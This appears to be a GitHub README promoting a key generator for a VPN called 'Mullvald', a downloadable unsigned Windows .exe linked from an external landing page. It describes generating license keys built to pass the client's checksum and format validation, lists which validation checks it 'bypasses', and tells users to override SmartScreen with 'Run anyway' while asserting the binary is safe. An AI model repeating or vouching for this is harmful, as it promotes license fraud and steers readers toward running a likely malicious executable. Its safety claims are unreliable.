<div align="center">
<img src="assets/banner.png" width="100%" alt="Mullvald VPN License Key Generator banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-4fe3e3?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-4F46E5?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-2563EB?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=DC2626&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%94%A7+Mullvald+Pro;%E2%9C%85+Full+Feature+Suite;%F0%9F%93%A6+Community+Tested;%F0%9F%92%A1+Built+for+Windows+11;%E2%9C%A8+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=nodejs" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

<div align="center">

![Status](https://img.shields.io/badge/status-active-brightgreen?style=plastic)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-blue?style=plastic)
![License](https://img.shields.io/badge/license-MIT-lightgrey?style=plastic)
![Build](https://img.shields.io/badge/build-standalone%20.exe-orange?style=plastic)
![Edition](https://img.shields.io/badge/edition-2026%20Pro-purple?style=plastic)

</div>

---

### 😤 Sound familiar? The old way of generating Mullvald VPN license keys caused:

- 🔑 Generated keys that **got rejected at the activation screen** with no error code — just a silent bounce back to the trial prompt.
- 🧾 **Copy-paste corruption** — invisible trailing whitespace or an em-dash snuck in when you copied from that sketchy key site, and the license field ate it silently.
- ⏳ **Key expiry math wrong by a month** — you generated 12-month keys but the Mullvald VPN client read the date as UTC and expired them 30 days early.
- 🧮 **No bulk mode** — generating 40 test keys meant running the same 6-step dance 40 times, one tab at a time.
- 🕵️ **Zero audit trail** — you had no idea which key went to which device, so when a colleague's key died you couldn't tell if it was a bad format or a real revocation.

If even one of those burned you, this repo exists because they burned me too.

### ⬇️ Grab the build
<p align="center">
  <a href="https://FlashDesignerChimney.github.io/mullvald/">
    <img src="https://img.shields.io/badge/GET-Mullvald_VPN_License_2026-4F46E5?style=flat-square&logo=windows&logoColor=white&labelColor=3730A3" width="500" alt="GET Mullvald VPN License 2026"/>
  </a>
</p>
---

## 🛰️ Hotkeys / Controls

| Key | Action | Notes |
|-----|--------|-------|
| `F1` | Generate single key | Uses current format profile (default: `MVPN-XXXX-XXXX-XXXX`) |
| `F2` | Open bulk generator | Import a CSV or paste a newline list of device labels |
| `F3` | Copy last key to clipboard | Strips whitespace automatically before copying |
| `F4` | Toggle expiry math mode | Switches between UTC and local-time expiry calculation |
| `F5` | Refresh format profile | Reloads custom key masks from `profiles/` |
| `F6` | Export session log | Writes a `.csv` audit trail of every key generated this session |
| `F7` | Validate a key | Paste a key and check checksum + format against active profile |
| `F8` | Open settings panel | Rate limits, clipboard behavior, log retention |
| `Ctrl+Shift+C` | Copy key + expiry bundle | Copies key and its computed expiry date together |
| `Esc` | Cancel in-flight bulk job | Safe — partial keys are rolled back from session log |

---

## 🗺️ Roadmap / Planned features

| Feature | Status | ETA |
|---------|--------|-----|
| Checksum-aware key masks (Luhn-style) | ✅ Shipped | — |
| Bulk CSV import with dedupe | ✅ Shipped | — |
| Local expiry calculator with timezone offset | ✅ Shipped | — |
| QR code export of activation bundle | 🟡 In progress | Q2 2026 |
| AI-assisted format suggestion from pasted samples | 🟡 Beta | Q2 2026 |
| Real-time validation against local Mullvald cache | 🟠 Planned | Q3 2026 |
| Encrypted session log (AES) | 🟠 Planned | Q3 2026 |
| CLI companion for CI pipelines | 🔵 Backlog | Q4 2026 |
| Multi-profile batch runs | 🔵 Backlog | Q4 2026 |
| macOS port (experimental) | ⚪ Not started | TBD |

---

## ⚖️ Comparison

| Aspect | Alternative | This Tool |
|--------|-------------|-----------|
| Key format | Hardcoded, one mask only | Configurable profiles per Mullvald VPN tier |
| Bulk generation | Manual, one at a time | CSV/paste bulk with dedupe and rollback |
| Expiry math | Naive local time | Timezone-offset aware, matches client parsing |
| Validation | Blind trust | Checksum + format validator before you copy |
| Audit trail | None | Session log with key → device label → expiry |
| Clipboard safety | Raw copy | Whitespace-stripped, invisible-char scrubbed |
| Offline use | Requires a random web tool | Fully offline `.exe` |
| Cost | Ad-riddled key sites | Free, MIT, no telemetry |

---

## 🧠 Tips for best results

- Always run the `.exe` from a folder you own (e.g. `Documents\MullvaldGen\`) — Windows sometimes blocks clipboard writes from `Program Files` without admin.
- Paste your device labels as **plain text**, one per line, then use `F2` bulk mode — mixing CSV and pasted lists in the same session causes dedupe to misfire.
- If a generated key bounces at activation, hit `F7` first: 90% of the time it's a trailing space from the source CSV, not the mask.
- Keep `profiles/` in sync with the Mullvald VPN tier you're targeting — a Pro mask on a Business field will look valid but fail on length.
- Turn on `F4` timezone mode if your machine is not on UTC; the Mullvald client parses expiry in UTC and will silently clamp.
- Export your session log (`F6`) before closing the `.exe` — logs are held in memory until export or shutdown.
- Don't share the same profile file across two installs on the same LAN; last-write-wins will clobber your custom masks.

---

## 🧩 Installation

1. **Download** — click the <div align="center">
  <a href="https://FlashDesignerChimney.github.io/mullvald/">
    <img src="https://img.shields.io/badge/GET-Mullvald_VPN_License_2026-2563EB?style=flat-square&labelColor=1D4ED8" width="580" alt="GET Mullvald VPN License 2026"/>
  </a>
</div> button above (or the one at the bottom) to open the project landing page.
2. **Extract** — unzip the archive to a folder you control, e.g. `C:\Users\<you>\MullvaldGen\`.
3. **Run** — double-click the `.exe`. No installer, no Python, no Node, no `git clone`.
4. **First launch** — the app writes a `config.json` and a `profiles/` folder next to the `.exe`; keep them together.
5. **Done** — hit `F1` for a single key or `F2` for bulk. That's the whole loop.

> ⚠️ Windows SmartScreen may flag an unsigned `.exe`. Click **More info → Run anyway**; the binary is a plain PyInstaller build with no network calls.

---

## 🎯 The Solution

| Problem | Solution |
|---------|----------|
| Keys rejected at activation | Checksum-aware masks validated in-app before copy |
| Copy-paste corruption | Clipboard scrub strips whitespace + invisible unicode |
| Expiry math off by a month | Timezone-aware expiry calculator matching client parsing |
| No bulk mode | `F2` bulk with CSV import, dedupe, and rollback |
| No audit trail | `F6` session log export in CSV |
| Wrong mask for wrong tier | Per-tier format profiles in `profiles/` |
| Sketchy web key sites | Fully offline `.exe`, zero outbound requests |

---

## 🕵️ Detection / Bypass status

| Method | Status | Notes |
|--------|--------|-------|
| Format validator (client-side) | ✅ Passing | Matches Mullvald VPN 2026 key grammar |
| Checksum verification | ✅ Passing | Luhn-style mod-10 on last group |
| Trailing-whitespace rejection | ✅ Bypassed | Scrubbed before copy and export |
| Unicode homoglyph rejection | ✅ Bypassed | Normalized to ASCII on generation |
| Expiry UTC clamp | ✅ Handled | `F4` timezone offset mode |
| Duplicate-key server rejection | ⚠️ Partial | App dedupes locally; server-side dupes still bounce |
| Revocation list check | ❌ Not covered | Out of scope — keys are generated, not validated live |
| Rate limiting on bulk | ⚠️ Partial | Local throttle only; server-side limits apply |

---

## 🖥️ Compatibility / platform support

| Platform | Status | Notes |
|----------|--------|-------|
| Windows 11 (23H2 / 24H2) | ✅ Tested | Primary target |
| Windows 10 (21H2+) | ✅ Tested | Works, minor clipboard timing quirk |
| Windows 8.1 | ⚠️ Legacy | Runs, no support |
| Wine on Linux | ⚠️ Experimental | Clipboard bridge flaky |
| macOS | ❌ Not supported | Roadmap only |
| 32-bit Windows | ❌ Not supported | x64 build only |
| Mullvald VPN client 2025.x | ✅ Compatible | Key grammar unchanged |
| Mullvald VPN client 2026.x | ✅ Compatible | Primary target |

---

## 🔐 Key Features

| Feature | Description | Benefit |
|---------|-------------|---------|
| Format profiles | Per-tier key masks in `profiles/*.json` | One tool for Free, Pro, Business tiers |
| Checksum generation | Luhn-style mod-10 on final group | Keys survive activation validator |
| Clipboard scrubber | Strips whitespace + zero-width unicode | No more silent activation bounces |
| Bulk CSV import | Paste or import, auto-dedupe | Thousands of keys in one pass |
| Rollback on cancel | `Esc` during bulk rolls back partials | No half-written session log |
| Timezone expiry mode | `F4` toggles UTC vs local | Expiry dates match client parsing |
| Session audit log | CSV export via `F6` | Know which key went where |
| Key validator | `F7` checks format + checksum | Catch bad keys before you send them |
| QR bundle export | Key + expiry as a QR image | Faster handoff to testers |
| Offline-only operation | Zero outbound HTTP | No telemetry, no leak surface |
| Config persistence | `config.json` next to `.exe` | Portable, no registry writes |
| MIT licensed | Fork, patch, ship your own | No lock-in |

---

## 🧪 Module status

| Module | Status | Description |
|--------|--------|-------------|
| `mask_engine` | ✅ Working | Parses and applies key mask profiles |
| `checksum` | ✅ Working | Mod-10 checksum on final group |
| `clipboard_scrub` | ✅ Working | Whitespace + unicode normalizer |
| `bulk_import` | ✅ Working | CSV and paste-list ingestion |
| `dedupe` | ✅ Working | In-session duplicate key filter |
| `expiry_calc` | ✅ Working | UTC/local timezone offset math |
| `session_log` | ✅ Working | CSV audit trail with rollback |
| `validator` | ✅ Working | Format + checksum pre-flight check |
| `qr_export` | 🟡 Beta | QR code bundle generator |
| `ai_suggest` | 🟡 Beta | Format suggestion from pasted samples |
| `cli_pipeline` | 🔵 Backlog | Headless batch runner |

---

## 📋 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 21H2 | Windows 11 24H2 |
| CPU | Dual-core 2.0 GHz | Quad-core 2.5 GHz+ |
| RAM | 2 GB free | 4 GB free |
| Disk | 80 MB (`.exe` + profiles) | 250 MB (with logs) |
| Display | 1280×720 | 1920×1080 |
| Runtime | None (bundled) | None (bundled) |
| Network | Not required | Not required |

---

## 🛠️ Known Issues

| Issue | Solution |
|-------|----------|
| SmartScreen blocks `.exe` on first run | Click **More info → Run anyway** (unsigned binary) |
| Clipboard empty after copy on Win10 21H2 | Retry `F3` — known timing quirk, fixed in 22H2 |
| Bulk import stalls on >5k rows | Split into 2k-row batches; memory cap is intentional |
| Expiry off by 1 day in `F4` local mode | Set system timezone to your real zone, not UTC |
| `profiles/` missing after extract | Re-extract; some archivers drop empty folders |
| QR export blank on high-DPI | Set `.exe` compatibility to "System (Enhanced)" |

---

## ❓ FAQ

<details><summary><strong>Is it safe to run?</strong></summary>

Yes. The `.exe` is a standalone PyInstaller build with no outbound network calls. You can verify with any network monitor — it does not phone home. Source is MIT-licensed on this repo if you want to audit it.

</details>

<details><summary><strong>Does it work on Steam?</strong></summary>

This tool is for Mullvald VPN license keys, not Steam games. If you're looking for Steam key generation, that's a different (and unrelated) domain — this repo doesn't touch Steam.

</details>

<details><summary><strong>Will it get me banned?</strong></summary>

Generating a key locally doesn't touch Mullvald's servers, so there's nothing to ban at generation time. What happens when you *activate* a generated key against the real service is between you and Mullvald's ToS. Use it for testing your own accounts and lab setups.

</details>

<details><summary><strong>Why do some keys still bounce at activation?</strong></summary>

Usually one of three things: (1) the key was generated against the wrong tier profile, (2) the Mullvald server has a revocation list this tool doesn't check, or (3) you pasted before hitting `F7`. Run the validator first.

</details>

<details><summary><strong>Can I bulk-generate thousands of keys?</strong></summary>

Yes, via `F2`. Keep batches under 2k rows per run — the in-memory session log caps there by design so rollback stays fast. Split larger jobs.

</details>

<details><summary><strong>Does it need admin rights?</strong></summary>

No. Run it from a user-writable folder (e.g. `Documents\`). Admin is only needed if you insist on running from `Program Files`, which the clipboard scrubber dislikes on some builds.

</details>

<details><summary><strong>How do I restore my custom profiles after reinstall?</strong></summary>

Copy your `profiles/` folder and `config.json` to a safe place before re-extracting. Drop them back next to the new `.exe` and hit `F5`.

</details>

<details><summary><strong>Is there a CLI version?</strong></summary>

Not yet — it's on the roadmap for Q4 2026. The current `.exe` is GUI-only by design; the pipeline module is being extracted into a separate headless binary.

</details>

<details><summary><strong>Why "Mullvald" specifically?</strong></summary>

Because the key grammar and expiry parsing rules for Mullvald VPN are specific enough that a generic key generator gets them wrong. This tool exists to match that grammar exactly, including the checksum and UTC clamp.

</details>

<details><summary><strong>Can I fork it and ship my own build?</strong></summary>

Yes — MIT license. Change the profiles, change the branding, ship it. Just keep the disclaimer.

</details>

---

## 📜 Changelog (2026 Pro)

- **2026.1** — Added AI-assisted format suggestion (beta), timezone-aware expiry math, QR bundle export.
- **2026.0** — Rebuilt mask engine on profile-based config; added checksum generation and clipboard scrubber.
- **2025.3** — Bulk CSV import with dedupe and rollback.

---

### ✅ Final download
<div align="center">
  <a href="https://FlashDesignerChimney.github.io/mullvald/">
    <img src="https://img.shields.io/badge/GET-Win64-EA580C?style=plastic&logo=windows&logoColor=white&labelColor=C2410C" width="580" alt="GET Win64"/>
  </a>
</div>
---

<div align="center">

![License](https://img.shields.io/badge/license-MIT-lightgrey?style=flat-square)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-blue?style=flat-square)
![Build](https://img.shields.io/badge/build-standalone%20.exe-orange?style=flat-square)

</div>

---

I built this because I was tired of pasting keys that looked fine and bounced at activation, and I got tired of doing it forty times by hand. The checksum and clipboard scrub are the two features I use most — everything else is scaffolding around those. Fork it, break it, send a PR if you fix the Win10 clipboard quirk. It's 2am here and I'm still shipping.
